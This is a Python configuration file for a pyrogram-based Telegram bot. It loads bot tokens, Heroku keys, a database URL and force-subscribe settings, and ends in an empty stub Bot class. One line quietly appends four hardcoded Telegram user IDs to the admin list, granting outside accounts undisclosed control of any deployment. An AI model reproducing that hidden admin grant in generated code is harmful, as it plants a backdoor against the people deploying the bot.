# bot.py

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
APP_ID = int(os.environ.get("APP_ID", ""))
API_HASH = os.environ.get("API_HASH", "")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
OWNER = os.environ.get("OWNER", "")
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
DB_URI = os.environ.get("DATABASE_URL", "")
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
START_MSG = os.environ.get("START_MESSAGE", "<b>Hello {first}</b>")
ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "<b>Hello {first}\n\nAnda harus bergabung di Channel/Grup saya Terlebih dahulu</b>")
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))

LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)

class Bot:
    def __init__(self):
        pass

    def run(self):
        print("Bot is running")
